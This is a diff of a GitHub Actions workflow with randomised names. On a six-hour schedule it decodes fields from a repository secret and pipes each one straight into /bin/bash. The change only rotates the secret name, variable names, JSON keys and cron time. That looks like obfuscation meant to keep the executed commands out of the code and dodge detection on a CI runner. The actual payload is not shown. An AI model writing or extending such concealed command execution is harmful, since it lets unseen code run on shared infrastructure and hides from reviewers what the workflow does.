@@ -1,9 +1,8 @@
 name: whirlwindarmistice
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 4/6 * * *'
+    - cron: '27 2/6 * * *'
 
 jobs:
   build:
@@ -12,11 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: whirlwindarmistice
         env:
-          xyocc39035: ${{ secrets.xyocc39035 }}
+          wggdp390: ${{ secrets.wggdp390 }}
         run: |
-          echo $xyocc39035 | jq -r .hdk184 | /bin/bash
-          echo $v228 | jq -r .nxszr7502 | /bin/bash
-          echo $bdpw862 | jq -r .icq97 | /bin/bash
-          echo $t2 | jq -r .gdwph152 | /bin/bash
-          echo $qou40551 | jq -r .or699 | /bin/bash
+          echo $wggdp390 | jq -r .xpx4492 | /bin/bash
+          echo $glede29442 | jq -r .tsdf8322 | /bin/bash
+          echo $azhj3008 | jq -r .n013 | /bin/bash
+          echo $fhibv5 | jq -r .golrw8228 | /bin/bash
+          echo $ec19146 | jq -r .w6600 | /bin/bash
 
